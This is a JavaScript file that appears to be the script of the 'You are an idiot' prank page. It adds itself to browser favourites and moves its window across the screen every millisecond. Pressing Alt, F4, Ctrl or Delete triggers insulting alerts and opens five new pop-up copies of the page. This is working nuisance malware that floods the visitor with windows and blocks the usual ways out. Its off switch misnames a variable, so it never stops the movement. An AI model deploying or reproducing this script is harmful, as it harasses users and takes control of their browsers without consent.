function bookmark() {
		if ((navigator.appName == "Microsoft Internet Explorer") 
		&& (parseInt(navigator.appVersion) >= 4)) 
		{
		var url="lol.html";
		var title="Idiot!";
		window.external.AddFavorite(url,title);
		}
		}

		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function procreate() {
	changeTitle("Idiot!");
	for (var i = 0; i < 5; i++) {
		openWindow('lol.html');
	}
}

function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
function ctrlkey() { if (event.keyCode == 17) { alert("You are an idiot!"); procreate(); } }
function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); } }

function newXlt(){
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10 ;
	window.focus()
}

function newXrt(){
	xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
}

function newYup(){
	yOff = Math.ceil(-6 * Math.random())  * 5 - 10 ;
}

function newYdn(){
	yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
}

function fOff(){
	flagrun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) {
		newXlt();
    }
    
	if (xPos < 0){
		newXrt();
    }
    
	if (yPos > screen.height - 330) {
        newYup();
    }   
		
	if (yPos < 0){
        newYdn();
    }
    
	if (flagRun == 1){
        window.moveTo(xPos, yPos);
        setTimeout('playBall()', 1);
    }
}
